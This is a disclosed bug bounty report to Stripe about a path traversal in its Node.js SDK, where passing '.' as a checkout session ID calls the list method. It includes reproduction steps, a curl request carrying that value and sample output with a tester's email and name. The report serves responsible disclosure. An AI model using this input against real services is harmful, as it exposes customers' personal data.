# Limited path traversal in Node.js SDK leads to PII disclosure

## Report Details
- **Report ID**: 1575014
- **URL**: https://hackerone.com/reports/1575014
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-05-18T21:15:20.826Z
- **Disclosed**: 2023-10-10T10:00:06.157Z

## Reporter
- **Username**: zerodivisi0n
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: stripe

## Vulnerability Information
## Summary:
It is possible to use `.` and `..` as identifier in all API methods, which leads to calling the parent api method.
Next, I will describe the problem using checkout sessions as an example,  because it is the most basic one. However, other methods are also vulnerable to this problem.
For example, using `.` as checkout session id in [Retrieve a Session](https://stripe.com/docs/api/checkout/sessions/retrieve) method leads to call [List all Checkout Sessions](https://stripe.com/docs/api/checkout/sessions/list) method.
The problem arises because the Node.js http implementation automatically normalizes the path, so request `https://api.stripe.com/v1/checkout/sessions/.` will normalize to `https://api.stripe.com/v1/checkout/sessions/`.
I checked other SDKs and it looks like the problem is only in the Node.js SDK.

## Steps To Reproduce:
For ease of reproduction, let's create a project using [accept-a-payment](https://github.com/stripe-samples/accept-a-payment) sample template.

  1. Register Stripe account and obtain `STRIPE_SECRET_KEY`
  1. Create sample project using Stripe docker cli: `docker run --rm -it -v $(pwd):/samples -w /samples stripe/stripe-cli:latest samples create accept-a-payment`
  1. Choose `prebuilt-checkout-page` integration, `html` client and `node` server.
  1. Create `.env` file in `accept-a-payment/server` directory with contents:
    ```
    STRIPE_SECRET_KEY=xxx
    STATIC_DIR=/app/client
    DOMAIN=http://localhost:4242
    ```
  1. Run another docker container with nodejs: `run -it --rm -v $(pwd)/accept-a-payment:/app -w /app/server -p 4242:4242 node bash`
  1. Install dependencies: `npm install`
  1. Start the server: `node server.js`
  1. Open web page in browser and complete the payment: `http://localhost:4242`
  1. Send curl request in terminal: `curl "http://localhost:4242/checkout-session?sessionId=." | jq` (this request does not require any authentication and returns PII of all successful payments).

Example output:
```json
{                                                                                                                                                                                                                  
  "object": "list",                                                                                                                                                                                                
  "data": [                                                                                                                                                                                                        
    {                                                                                                                                                                                                              
      "id": "cs_test_a14L46PUF4tbXhcFrVU4Zv42kBQD2Hw5TIR6XdNHPJFckllG1Un4MztwlF",                                                                                                                                  
      "object": "checkout.session",                                                                                                                                                                                
      "after_expiration": null,                                                                                                                                                                                    
      "allow_promotion_codes": null,                                                                                                                                                                               
      "amount_subtotal": 500,                                                                                                                                                                                      
      "amount_total": 500,                                                                                                                                                                                         
      "automatic_tax": {                                                                                                                                                                                           
        "enabled": false,                                                                                                                                                                                          
        "status": null                                                                                                                                                                                             
      },                                                                                                                                                                                                           
      "billing_address_collection": null,                                                                                                                                                                          
      "cancel_url": "http://localhost:4242/canceled.html",                                                                                                                                                         
      "client_reference_id": null,                                                                                                                                                                                 
      "consent": null,                                                                                                                                                                                             
      "consent_collection": null,                                                                                                                                                                                  
      "currency": "usd",                                                                                                                                                                                           
      "customer": "cus_LiJwdI9LfI4c9k",                                                                                                                                                                            
      "customer_creation": "always",                                                                                                                                                                               
      "customer_details": {                                                                                                                                                                                        
        "address": {                                                                                     
          "city": null,                                                                                  
          "country": "RU",
          "line1": null,
          "line2": null,
          "postal_code": null,
          "state": null                                                                                  
        },                         
        "email": "zerodivisi0n@wearehackerone.com",
        "name": "BB Tester",        
        "phone": null,       
        "tax_exempt": "none",
        "tax_ids": []   
      }
      "customer_email": null,                                                                                                                                                                                      
      "expires_at": 1652991126,                                                                                                                                                                                    
      "livemode": false,                                                                                                                                                                                           
      "locale": null,                                                                                                                                                                                              
      "metadata": {                                                                                                                                                                                                
      },                                                                                                                                                                                                           
      "mode": "payment",                                                                                                                                                                                           
      "payment_intent": "pi_3L0tE3DrJVF2EnNj1zw13o1n",                                                                                                                                                             
      "payment_link": null,                                                                                                                                                                                        
      "payment_method_options": {                                                                                                                                                                                  
      },                                                                                                                                                                                                           
      "payment_method_types": [                                                                                                                                                                                    
        "card"                                                                                                                                                                                                     
      ],                                                                                                                                                                                                           
      "payment_status": "paid",                                                                                                                                                                                    
      "phone_number_collection": {                                                                                                                                                                                 
        "enabled": false                                                                                                                                                                                           
      },                                                                                                                                                                                                           
      "recovered_from": null,                                                                                                                                                                                      
      "setup_intent": null,                                                                                                                                                                                        
      "shipping": null,                                                                                                                                                                                            
      "shipping_address_collection": null,                                                                                                                                                                         
      "shipping_options": [                                                                                                                                                                                        
                                                                                                                                                                                                                   
      ],                                                                                                                                                                                                           
      "shipping_rate": null,                                                                                                                                                                                       
      "status": "complete",                                                                                                                                                                                        
      "submit_type": null,                                                                                                                                                                                         
      "subscription": null,                                                                                                                                                                                        
      "success_url": "http://localhost:4242/success.html?session_id={CHECKOUT_SESSION_ID}",                                                                                                                        
      "total_details": {                                                                                                                                                                                           
        "amount_discount": 0,                                                                                                                                                                                      
        "amount_shipping": 0,                                                                                                                                                                                      
        "amount_tax": 0                                                                                                                                                                                            
      },                                                                                                                                                                                                           
      "url": null                                                                                                                                                                                                  
    }                                                                                                                                                                                                              
  ],                                                                                                                                                                                                               
  "has_more": false,                                                                                                                                                                                               
  "url": "/v1/checkout/sessions"
}
```

In my example, only one session is returned, but in reality all current user sessions will be returned there.
I understand that this is only sample code and there may be more reliable implementations in production. However, such a sample code is usually used as a reference and I think that protection against this kind of attacks should be at the SDK level.

## Impact

The attacker can periodically call this method and grab PII, such as user's email address, name and address.

## Attachments
No attachments
